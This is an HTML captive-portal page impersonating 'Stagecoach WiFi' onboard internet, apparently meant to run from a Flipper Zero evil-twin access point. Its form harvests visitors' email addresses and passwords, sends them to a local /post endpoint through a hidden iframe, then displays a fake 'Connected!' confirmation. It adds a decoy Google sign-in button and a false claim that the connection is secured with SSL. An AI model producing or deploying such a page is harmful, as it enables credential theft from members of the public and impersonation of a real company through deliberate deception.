<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Stagecoach WiFi - Connect</title>

<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  background:#005cab;
  background:linear-gradient(135deg,#005cab,#003f7d,#002f5c);
  color:#fff;
}

.container{width:90%;max-width:380px;text-align:center}

.card{
  background:rgba(255,255,255,.10);
  backdrop-filter:blur(18px);
  border-radius:20px;
  padding:40px 30px;
  border:1px solid rgba(255,255,255,.18);
  box-shadow:0 8px 32px rgba(0,0,0,.35);
}

.logo{
  width:160px;
  margin:0 auto 20px;
}

.logo img{
  width:100%;
  opacity:.95;
}

h1{
  font-size:22px;
  font-weight:600;
  margin-bottom:6px;
}

.subtitle{
  font-size:13px;
  color:rgba(255,255,255,.7);
  margin-bottom:28px;
}

.field{position:relative;margin-bottom:16px}

.field input{
  width:100%;
  padding:14px 16px;
  background:rgba(255,255,255,.08);
  border:1px solid rgba(255,255,255,.20);
  border-radius:12px;
  color:#fff;
  font-size:15px;
  outline:none;
  transition:border .2s,background .2s;
}

.field input::placeholder{color:rgba(255,255,255,.45)}

.field input:focus{
  border-color:#f0c14b;
  background:rgba(255,255,255,.12);
}

.btn{
  width:100%;
  padding:14px;
  background:#f0c14b;
  border:none;
  border-radius:12px;
  color:#333;
  font-size:16px;
  font-weight:600;
  cursor:pointer;
  transition:transform .15s,box-shadow .15s;
  margin-top:4px;
}

.btn:hover{
  box-shadow:0 4px 20px rgba(240,193,75,.4);
}

.btn:active{transform:scale(.98)}

.divider{
  display:flex;
  align-items:center;
  margin:20px 0;
  gap:12px;
}

.divider span{
  font-size:12px;
  color:rgba(255,255,255,.4);
  white-space:nowrap;
}

.divider::before,.divider::after{
  content:'';
  flex:1;
  height:1px;
  background:rgba(255,255,255,.15);
}

.social-btn{
  width:100%;
  padding:12px;
  background:rgba(255,255,255,.08);
  border:1px solid rgba(255,255,255,.18);
  border-radius:12px;
  color:rgba(255,255,255,.85);
  font-size:14px;
  cursor:pointer;
  transition:background .2s;
  margin-bottom:8px;
  display:flex;
  align-items:center;
  justify-content:center;
  gap:8px;
}

.social-btn:hover{
  background:rgba(255,255,255,.15);
}

.terms{
  font-size:11px;
  color:rgba(255,255,255,.55);
  margin-top:20px;
  line-height:1.5;
}

.terms a{
  color:#f0c14b;
  text-decoration:none;
}

.lock{
  display:inline-block;
  margin-right:4px;
  vertical-align:middle;
  opacity:.6;
}
</style>
</head>

<body>
<div class="container">
<div class="card">

<!-- LOCAL LOGO (works on Flipper) -->
<div class="logo">
  <img src="stagecoach.png">
</div>

<h1>Welcome to Stagecoach WiFi</h1>
<p class="subtitle">Sign in to connect to free onboard WiFi</p>

<form id="f" method="POST" action="/post" target="h">
  <div class="field">
    <input name="email" type="text" placeholder="Email address" required autocomplete="off">
  </div>

  <div class="field">
    <input name="password" type="password" placeholder="Password" required>
  </div>

  <button class="btn" type="submit">Connect</button>
</form>

<iframe name="h" style="display:none"></iframe>

<div id="ok" style="display:none;text-align:center;padding:20px 0">
  <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
    <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
    <polyline points="22 4 12 14.01 9 11.01"/>
  </svg>
  <h2 style="color:#4ade80;margin:12px 0 6px">Connected!</h2>
  <p style="font-size:13px;color:rgba(255,255,255,.6)">You now have internet access.<br>This page will close automatically.</p>
</div>

<div id="login-extra">
  <div class="divider"><span>or continue with</span></div>

  <button class="social-btn" onclick="document.querySelector('[name=email]').focus()">
    Google
  </button>

  <p class="terms">
    <svg class="lock" width="10" height="10" viewBox="0 0 24 24" fill="currentColor">
      <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3-9H9V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2z"/>
    </svg>
    Your connection is secured with SSL encryption.<br>
    By connecting you agree to our <a href="#">Terms of Service</a>
  </p>
</div>

<script>
document.getElementById('f').addEventListener('submit',function(){
  setTimeout(function(){
    document.getElementById('f').style.display='none';
    document.getElementById('login-extra').style.display='none';
    document.getElementById('ok').style.display='block';
  },500)
})
</script>

</div>
</div>
</body>
</html>
